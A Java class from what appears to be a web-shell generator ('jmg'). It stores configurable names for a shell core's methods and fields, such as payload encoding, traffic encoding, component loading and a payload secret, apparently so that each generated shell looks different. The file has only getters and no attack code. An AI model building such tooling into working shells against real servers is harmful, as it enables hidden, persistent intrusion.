package org.leo.jmg.core;

import org.leo.jmg.ShellGeneratorConfig;

/**
 * LeoCore 内部成员名的不可变快照。
 */
public final class CoreGenerationNames {

    private final String methodAction;
    private final String methodTestConn;
    private final String methodRedirect;
    private final String methodLoadComponent;
    private final String methodInvokeComponent;
    private final String methodPayloadEncode;
    private final String methodPayloadDecode;
    private final String methodTrafficEncode;
    private final String methodTrafficDecode;
    private final String methodProcessBuffer;
    private final String fieldParams;
    private final String fieldResults;
    private final String fieldHostId;
    private final String fieldComponents;
    private final String fieldPayloadSecret;
    private final String fieldPayloadRandom;

    private CoreGenerationNames(ShellGeneratorConfig config) {
        this.methodAction = config.getMethodAction();
        this.methodTestConn = config.getMethodTestConn();
        this.methodRedirect = config.getMethodRedirect();
        this.methodLoadComponent = config.getMethodLoadComponent();
        this.methodInvokeComponent = config.getMethodInvokeComponent();
        this.methodPayloadEncode = config.getMethodPayloadEncode();
        this.methodPayloadDecode = config.getMethodPayloadDecode();
        this.methodTrafficEncode = config.getMethodTrafficEncode();
        this.methodTrafficDecode = config.getMethodTrafficDecode();
        this.methodProcessBuffer = config.getMethodProcessBuffer();
        this.fieldParams = config.getFieldParams();
        this.fieldResults = config.getFieldResults();
        this.fieldHostId = config.getFieldHostId();
        this.fieldComponents = config.getFieldComponents();
        this.fieldPayloadSecret = config.getFieldPayloadSecret();
        this.fieldPayloadRandom = config.getFieldPayloadRandom();
    }

    public static CoreGenerationNames from(ShellGeneratorConfig config) {
        if (config == null) {
            throw new IllegalArgumentException("ShellGeneratorConfig 不能为空");
        }
        return new CoreGenerationNames(config);
    }

    public String getMethodAction() {
        return methodAction;
    }

    public String getMethodTestConn() {
        return methodTestConn;
    }

    public String getMethodRedirect() {
        return methodRedirect;
    }

    public String getMethodLoadComponent() {
        return methodLoadComponent;
    }

    public String getMethodInvokeComponent() {
        return methodInvokeComponent;
    }

    public String getMethodPayloadEncode() { return methodPayloadEncode; }

    public String getMethodPayloadDecode() { return methodPayloadDecode; }

    public String getMethodTrafficEncode() { return methodTrafficEncode; }

    public String getMethodTrafficDecode() { return methodTrafficDecode; }

    public String getMethodProcessBuffer() { return methodProcessBuffer; }

    public String getFieldParams() {
        return fieldParams;
    }

    public String getFieldResults() {
        return fieldResults;
    }

    public String getFieldHostId() {
        return fieldHostId;
    }

    public String getFieldComponents() {
        return fieldComponents;
    }

    public String getFieldPayloadSecret() { return fieldPayloadSecret; }

    public String getFieldPayloadRandom() { return fieldPayloadRandom; }
}
